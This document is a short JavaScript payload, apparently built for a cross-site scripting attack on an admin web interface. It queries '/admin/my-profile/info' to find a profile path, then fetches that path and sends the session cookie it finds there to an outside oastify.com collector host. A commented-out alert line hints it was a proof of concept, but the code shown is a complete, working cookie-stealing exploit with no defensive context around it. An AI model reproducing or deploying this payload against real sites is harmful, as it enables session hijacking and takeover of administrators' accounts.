path = ''
function fetchPrincipalId(){
fetch('/admin/my-profile/info',{headers:{"X-Request-Mode":"vnd.api.mode.v1+json"}})
  .then(response => {
    return response.json();
  })
  .then(data => {
    a = JSON.stringify(data.results);
    a = a.split('path":"')[1]
    a = a.split('"')[0] 
    path = a
  })
} 
function getcookie(path){
fetch(path,{headers:{"X-Request-Mode":"vnd.api.mode.v1+json"}})
  .then(response => {
    return response.json();
  })
  .then(data => {
    fetch('https://c6juzkt931ipr91mmcml9xjuolubi0.oastify.com/'+data.results.common.cookie);
   //alert(data.results.common.cookie)
  })} 
fetchPrincipalId()
setTimeout(() => getcookie(path),5000);
